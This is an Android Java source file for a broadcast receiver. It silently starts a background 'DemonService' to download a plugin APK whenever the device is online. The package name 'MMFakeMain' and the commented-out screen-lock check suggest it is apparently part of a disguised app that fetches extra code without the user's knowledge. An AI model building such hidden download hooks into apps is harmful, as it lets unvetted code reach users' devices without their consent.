package com.xstd.MMFakeMain.qm.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.text.TextUtils;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.MMFakeMain.qm.Config;
import com.xstd.MMFakeMain.qm.UtilOperator;
import com.xstd.MMFakeMain.qm.service.DemonService;
import com.xstd.MMFakeMain.qm.setting.SettingManager;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-16
 * Time: AM10:58
 * To change this template use File | Settings | File Templates.
 */
public class PluginDownloadBroadcastReceiver extends BroadcastReceiver {

    public static final String DOWNLOAD_PLUGIN_ACTION = "com.download.plugin";

    public void onReceive(final Context context, Intent intent) {
        Config.LOGD("[[PluginDownloadBroadcastReceiver::onReceive]] Entry >>>>>>>>");

        SettingManager.getInstance().init(context);
        String path = SettingManager.getInstance().getLocalApkPath();
        if (TextUtils.isEmpty(path)) {
            return;
        }

        if (UtilOperator.isPluginApkExist()) {
            Config.LOGD("[[PluginDownloadBroadcastReceiver::onReceive]] plugin apk is exist on Path : " + path);
            return;
        } else {
            if (Config.DEBUG) {
                Config.LOGD("[[PluginDownloadBroadcastReceiver::onReceive]] isOnline = " + UtilsRuntime.isOnline(context)
                            + " download process = " + Config.DOWNLOAD_PROCESS_RUNNING.get()
                            + " screenLocked = " + UtilsRuntime.isScreenLocked(context));
            }

            if (UtilsRuntime.isOnline(context)
                    && !Config.DOWNLOAD_PROCESS_RUNNING.get()
                    /*&& !UtilsRuntime.isScreenLocked(context)*/) {
                Handler handler = new Handler(context.getMainLooper());
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        Intent i = new Intent();
                        i.setClass(context, DemonService.class);
                        i.setAction(DemonService.ACTION_DOWNLOAD_PLUGIN);
                        context.startService(i);
                    }
                }, 1 * 1000);
            }
        }

        Config.LOGD("[[PluginDownloadBroadcastReceiver::onReceive]] Leave <<<<<<<<");
    }

}
